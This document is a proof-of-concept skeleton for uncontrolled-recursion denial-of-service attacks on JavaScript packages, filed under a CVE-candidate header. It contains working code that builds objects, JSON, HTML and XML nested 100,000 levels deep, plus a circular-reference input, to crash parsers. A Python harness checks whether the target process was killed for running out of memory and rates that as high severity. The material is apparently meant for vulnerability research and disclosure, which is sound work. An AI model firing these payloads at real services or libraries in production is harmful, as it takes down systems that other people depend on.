# PoC Skeleton -- Recursion DoS

## JavaScript PoC

```js
/**
 * CVE-CANDIDATE: Stack Overflow DoS in [package-name] [version]
 * CWE: CWE-674 (Uncontrolled Recursion)
 * CVSS: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
 */
const pkg = require('[package-name]');

// Create deeply nested structure
function createNested(depth) {
  let obj = { value: 'leaf' };
  for (let i = 0; i < depth; i++) {
    obj = { nested: obj };
  }
  return obj;
}

const payload = createNested(100000);
console.log('[*] Payload nesting depth: 100000');
console.log('[*] Processing...');

try {
  pkg.process(payload);
  console.log('[!] No crash -- function handled deep nesting');
} catch (e) {
  if (e instanceof RangeError) {
    console.log('[+] RangeError:', e.message);
    console.log('[*] Note: catchable error. Check if library catches it.');
  } else {
    console.log('[+] Unexpected error:', e.message);
  }
}
// If process exits with no output, OOM killed (HIGH severity)
```

## String-Based Nesting (for parsers)

```js
// Create deeply nested string representation
function createNestedString(depth, open, close) {
  let s = 'x';
  for (let i = 0; i < depth; i++) {
    s = open + s + close;
  }
  return s;
}

// JSON: {"a":{"a":{"a":...}}}
const jsonPayload = createNestedString(100000, '{"a":', '}');

// HTML: <div><div><div>...</div></div></div>
const htmlPayload = createNestedString(100000, '<div>', '</div>');

// XML: <a><a><a>...</a></a></a>
const xmlPayload = createNestedString(100000, '<a>', '</a>');
```

## Circular Reference (Infinite Loop)

```js
const obj = {};
obj.self = obj;

try {
  pkg.process(obj); // Should detect circular ref
} catch (e) {
  console.log('[+] Error:', e.message);
}
```

## Subprocess Test (Measure OOM vs RangeError)

```python
#!/usr/bin/env python3
import subprocess
result = subprocess.run(
    ['node', 'poc.js'],
    capture_output=True, timeout=30
)
if result.returncode == -9 or result.returncode == -6:
    print('[+] CONFIRMED: OOM kill (HIGH severity)')
elif result.returncode != 0:
    print(f'[*] Crash with exit code {result.returncode}')
else:
    print('[!] No crash')
```
